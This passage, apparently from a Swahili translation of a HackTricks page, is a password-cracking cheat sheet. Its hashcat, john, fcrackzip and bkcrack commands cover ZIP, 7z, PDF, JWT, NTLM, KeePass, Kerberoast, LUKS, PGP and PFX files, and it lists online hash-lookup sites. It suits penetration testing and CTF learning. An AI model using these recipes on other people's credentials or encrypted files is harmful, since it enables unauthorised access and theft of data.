* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 na/au bila ESS/SSP na na thamani yoyote ya changamoto)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, na nyaraka za MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes na file hashes)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Angalia hii kabla ya kujaribu kuvunja nguvu Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Shambulizi la zip ya maandishi yaliyofahamika

Unahitaji kujua **maandishi ya wazi** (au sehemu ya maandishi ya wazi) **ya faili iliyomo ndani** ya zip iliyofichwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo** ndani ya zip iliyofichwa kwa kukimbia: **`7z l encrypted.zip`**\
Pakua [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) kutoka ukurasa wa matoleo.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Brute-forcing a password-protected 7z file can be done using tools like `7z2hashcat` or `hashcat`. These tools can convert the 7z file's password hash into a format that can be cracked using a brute-force attack.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords from PDF files. Tools like **pdfcrack** and **PDF Password Cracker** can be used to automate the process. These tools work by trying all possible password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming, especially if the password is long and complex.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Nenosiri la Mmiliki wa PDF

Ili kuvunja nenosiri la mmiliki wa PDF angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Kuvunja NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass ni chombo cha usimamizi wa nywila kinachotumika kuhifadhi na kusimamia nywila za mtumiaji. Inatumia encryption ili kulinda data zilizohifadhiwa.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Picha ya Lucks

#### Mbinu 1

Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Mbinu 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Mafunzo mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Funguo ya Siri ya PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha john

### Open Office Pwd Protected Column

Ikiwa una faili ya xlsx na safu iliyolindwa kwa nenosiri unaweza kuiondoa ulinzi:

* **Iipakie kwenye google drive** na nenosiri litafutwa moja kwa moja
* Kui **ondoa** **kwa mikono**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Vyeti vya PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za **jamii** za **juu kabisa** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zana

**Mifano ya Hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Kitambulisho cha Hash
```bash
hash-identifier
> <HASH>
```
### Orodha za Maneno

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Vyombo vya Kuzalisha Orodha za Maneno**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya kipekee ya kutembea kwa kibodi yenye herufi za msingi zinazoweza kubadilishwa, ramani ya kibodi na njia.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Kubadilisha John

Soma _**/etc/john/john.conf**_ na uipange
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Mashambulizi ya Hashcat

* **Mashambulizi ya Orodha ya Maneno** (`-a 0`) na sheria

**Hashcat** tayari inakuja na **folda inayohifadhi sheria** lakini unaweza kupata [**sheria nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Mbinu ya kushambulia orodha ya maneno**

Inawezekana **kuunganisha orodha 2 za maneno kuwa 1** na hashcat.\
Ikiwa orodha ya kwanza ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yataundwa.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Shambulizi la Barakoa** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Orodha ya Maneno + Kinyago (`-a 6`) / Kinyago + Orodha ya Maneno (`-a 7`) shambulio
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Aina za Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Kuvunja Hashes za Linux - faili ya /etc/shadow

Kwa kawaida, faili ya `/etc/shadow` ina hashes za nywila za watumiaji kwenye mfumo wa Linux. Kuvunja hashes hizi kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria (brute force) au mbinu zingine za kuvunja nywila. Mara nyingi, kuvunja nywila za Linux kunahusisha kutumia dictionaries au wordlists kwa kufikiria nywila zilizowezekana.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Kuvunja Windows Hashes

Kuvunja Windows Hashes kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria. Hii inahusisha jaribio la kila aina ya nenosiri linalowezekana hadi hash inayolinganishwa inapatikana. Kuna zana nyingi zinazopatikana kama Hashcat au John the Ripper ambazo zinaweza kutumika kwa madhumuni haya. Mara tu hash inapovunjwa, inaweza kutafsiriwa kuwa nenosiri la asili kwa kutumia meza ya upatanishi ya nenosiri.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
### Kuvunja Hashes za Maombi Maarufu

Kuvunja nywila za maombi maarufu kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufanya kazi (brute force) au kutumia orodha ya maneno (wordlist) ili kulinganisha na hash iliyopatikana. Mbinu hizi zinaweza kutumika kuvunja nywila za maombi kama vile WordPress au Joomla. Kwa kutumia programu za kuvunja nywila kama Hashcat au John the Ripper, unaweza kujaribu mamilioni ya kombinisheni za nywila kwa haraka sana. Kumbuka kuwa kuvunja nywila bila idhini ni kinyume cha sheria na inapaswa kufanywa kwa kuzingatia maadili ya kisheria.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kudhibiti mchakato** kwa urahisi kutumia zana za **jamii za hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
